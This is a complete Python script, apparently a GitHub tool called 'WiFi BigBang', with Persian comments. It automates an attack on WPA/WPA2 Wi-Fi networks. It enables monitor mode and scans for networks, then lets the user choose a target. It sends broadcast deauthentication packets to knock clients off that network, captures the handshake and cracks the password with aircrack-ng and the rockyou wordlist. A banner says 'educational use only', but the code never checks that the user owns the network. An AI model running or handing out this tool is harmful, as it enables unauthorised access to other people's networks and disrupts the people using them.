#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WiFi BigBang 🔥
Automated WPA/WPA2 Cracker for Ethical Use Only
Author: Ankit
GitHub: https://github.com/your-username/wifi-bigbang
"""

import os
import re
import time
import subprocess
import sys
from typing import List, Optional

# ───────────────────────────────────────
# 🎨 بنر زیبا در ابتدای اجرا
# ───────────────────────────────────────
def print_banner():
    banner = """
\033[1;36m
██╗    ██╗██╗███████╗████████╗ ██████╗ ██╗  ██╗███████╗██████╗ 
██║    ██║██║██╔════╝╚══██╔══╝██╔════╝ ██║  ██║██╔════╝██╔══██╗
██║ █╗ ██║██║███████╗   ██║   ██║  ███╗███████║█████╗  ██████╔╝
██║███╗██║██║╚════██║   ██║   ██║   ██║██╔══██║██╔══╝  ██╔══██╗
╚███╔███╔╝██║███████║   ██║   ╚██████╔╝██║  ██║███████╗██║  ██║
 ╚══╝╚══╝ ╚═╝╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
\033[1;35m                🔥 WiFi BigBang by Ankit 🔥
\033[0m
⚠️  For educational use ONLY on networks you OWN.
"""
    print(banner)

# ───────────────────────────────────────
# تنظیمات
# ───────────────────────────────────────
WORDLIST = "/usr/share/wordlists/rockyou.txt"
CAPTURE_FILE = "bigbang_capture"
DEAUTH_COUNT = 10
SCAN_DURATION = 12

# ───────────────────────────────────────
# توابع کمکی
# ───────────────────────────────────────
def run_cmd(cmd: str, capture: bool = False):
    return subprocess.run(cmd, shell=True, capture_output=capture, text=capture)

def is_root() -> bool:
    return os.geteuid() == 0

def find_wifi_interface() -> Optional[str]:
    res = run_cmd("iwconfig", capture=True)
    for line in (res.stdout + res.stderr).split('\n'):
        if 'IEEE 802.11' in line and 'Mode:Managed' in line:
            return line.split()[0]
    return None

def start_monitor_mode(iface: str) -> str:
    print("\033[1;33m[*]\033[0m Killing interfering processes...")
    run_cmd("sudo airmon-ng check kill > /dev/null 2>&1")
    print(f"\033[1;33m[*]\033[0m Enabling monitor mode on {iface}...")
    run_cmd(f"sudo airmon-ng start {iface} > /dev/null 2>&1")
    time.sleep(2)

    res = run_cmd("iwconfig", capture=True)
    for line in (res.stdout + res.stderr).split('\n'):
        if 'Mode:Monitor' in line:
            return line.split()[0]
    raise RuntimeError("Monitor mode failed")

def stop_monitor_mode(mon_iface: str):
    run_cmd(f"sudo airmon-ng stop {mon_iface} > /dev/null 2>&1")
    run_cmd("sudo systemctl restart NetworkManager > /dev/null 2>&1")

def scan_networks(mon_iface: str) -> List[dict]:
    csv_file = f"/tmp/bb_scan_{int(time.time())}"
    print(f"\033[1;33m[*]\033[0m Scanning networks for {SCAN_DURATION} seconds...")
    proc = subprocess.Popen(
        f"sudo timeout {SCAN_DURATION}s airodump-ng --write-interval 1 -w {csv_file} --output-format csv {mon_iface}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(SCAN_DURATION + 1)
    proc.terminate()

    csv_path = f"{csv_file}-01.csv"
    networks = []
    if os.path.exists(csv_path):
        with open(csv_path, 'r', errors='ignore') as f:
            lines = f.readlines()
        for line in lines[1:]:
            if line.strip() == "": break
            parts = [p.strip() for p in line.split(',')]
            if len(parts) > 13 and re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', parts[0]):
                bssid = parts[0].upper()
                ch = parts[3].strip()
                essid = parts[13].strip().strip('"')
                if essid and essid != "\\x00" and essid != "":
                    networks.append({"bssid": bssid, "channel": ch, "essid": essid})
        os.remove(csv_path)
    return networks

def display_networks(networks: List[dict]):
    print("\n" + "\033[1;32m" + "="*70 + "\033[0m")
    print(f"\033[1;32m{'#':<4} {'ESSID':<35} {'BSSID':<18} {'CH'}\033[0m")
    print("\033[1;32m" + "="*70 + "\033[0m")
    for i, net in enumerate(networks, 1):
        name = (net['essid'][:33] + '..') if len(net['essid']) > 35 else net['essid']
        print(f"\033[1;37m{i:<4} {name:<35} {net['bssid']:<18} {net['channel']}\033[0m")
    print("\033[1;32m" + "="*70 + "\033[0m")

def capture_and_deauth(mon_iface: str, bssid: str, ch: str):
    cap_proc = subprocess.Popen(
        f"sudo airodump-ng -c {ch} --bssid {bssid} -w {CAPTURE_FILE} {mon_iface}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(3)
    print("\033[1;33m[*]\033[0m Sending deauth packets (broadcast)...")
    run_cmd(f"sudo aireplay-ng -0 {DEAUTH_COUNT} -a {bssid} -c FF:FF:FF:FF:FF:FF {mon_iface} > /dev/null 2>&1")
    return cap_proc

def handshake_ready() -> bool:
    cap = f"{CAPTURE_FILE}-01.cap"
    if not os.path.exists(cap): return False
    res = run_cmd(f"aircrack-ng {cap} 2>/dev/null | grep -i '1 handshake'", capture=True)
    return "handshake" in res.stdout.lower()

def crack() -> Optional[str]:
    cap = f"{CAPTURE_FILE}-01.cap"
    if not os.path.exists(WORDLIST):
        print("\033[1;31m[-]\033[0m rockyou.txt not found. Run: sudo gunzip /usr/share/wordlists/rockyou.txt.gz")
        return None

    print("\033[1;33m[*]\033[0m Cracking with rockyou.txt... (be patient)")
    run_cmd(f"aircrack-ng -w {WORDLIST} -l cracked.txt {cap} > /dev/null 2>&1")
    if os.path.exists("cracked.txt"):
        with open("cracked.txt") as f:
            pwd = f.read().strip()
        os.remove("cracked.txt")
        return pwd
    return None

def cleanup():
    for ext in ["cap", "csv", "kismet.csv", "kismet.netxml", "log.csv"]:
        f = f"{CAPTURE_FILE}-01.{ext}"
        if os.path.exists(f):
            os.remove(f)

# ───────────────────────────────────────
# تابع اصلی
# ───────────────────────────────────────
def main():
    print_banner()

    if not is_root():
        print("\033[1;31m[-]\033[0m Please run with \033[1msudo\033[0m.")
        sys.exit(1)

    iface = find_wifi_interface()
    if not iface:
        print("\033[1;31m[-]\033[0m No compatible Wi-Fi interface found.")
        sys.exit(1)

    print(f"\033[1;32m[+]\033[0m Detected interface: \033[1m{iface}\033[0m")
    mon_iface = None

    try:
        mon_iface = start_monitor_mode(iface)
        networks = scan_networks(mon_iface)

        if not networks:
            print("\033[1;31m[-]\033[0m No networks detected.")
            return

        display_networks(networks)

        try:
            choice = int(input("\n\033[1;36m[?]\033[0m Enter network number to attack: ").strip()) - 1
            if choice < 0 or choice >= len(networks):
                raise ValueError
        except (ValueError, KeyboardInterrupt):
            print("\n\033[1;31m[-]\033[0m Invalid selection.")
            return

        target = networks[choice]
        print(f"\n\033[1;32m[+]\033[0m Target: \033[1m{target['essid']}\033[0m ({target['bssid']})")

        cap_proc = capture_and_deauth(mon_iface, target['bssid'], target['channel'])

        print("\033[1;33m[*]\033[0m Waiting for handshake (max 60 sec)...")
        for _ in range(12):
            time.sleep(5)
            if handshake_ready():
                print("\033[1;32m[+]\033[0m Handshake captured!")
                cap_proc.terminate()
                break
        else:
            print("\033[1;31m[-]\033[0m Handshake not captured.")
            cap_proc.terminate()
            print("\nI can't connect")
            return

        pwd = crack()
        if pwd:
            print(f"\n\033[1;32m[🎉] PASSWORD FOUND:\033[0m \033[1;33m{pwd}\033[0m\n")
        else:
            print("\n\033[1;31m[-]\033[0m Password not in wordlist.")
            print("I can't connect")

    finally:
        cleanup()
        if mon_iface:
            stop_monitor_mode(mon_iface)
        print("\033[1;36m[✓]\033[0m Cleanup complete. Goodbye! 👋\n")

if __name__ == "__main__":
    main()